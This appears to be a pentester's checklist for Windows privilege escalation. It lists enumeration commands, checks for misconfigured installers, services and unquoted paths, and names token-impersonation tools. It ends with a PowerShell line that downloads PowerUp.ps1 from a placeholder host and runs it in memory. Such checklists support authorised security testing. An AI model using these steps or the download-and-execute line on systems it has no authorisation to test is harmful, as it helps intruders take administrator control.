# Windows Privilege Escalation Checklist

## Enumeration (PowerShell)
```powershell
whoami
whoami /priv
whoami /groups
systeminfo
net user
net localgroup Administrators
netstat -ano
schtasks /query /fo LIST /v
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Get-Service
Get-Process
```

## AlwaysInstallElevated
Check registry:
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Service Permissions
```powershell
sc qc <service>
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```

## Unquoted Service Paths
```powershell
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows" | findstr /i /v """
```

## Token Impersonation
- `SeImpersonatePrivilege` → JuicyPotato, RoguePotato, PrintSpoofer
- `SeAssignPrimaryToken` → Similar attacks

## PowerUp / WinPEAS
- `IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerUp.ps1'); Invoke-AllChecks`
- `winpeas.exe`
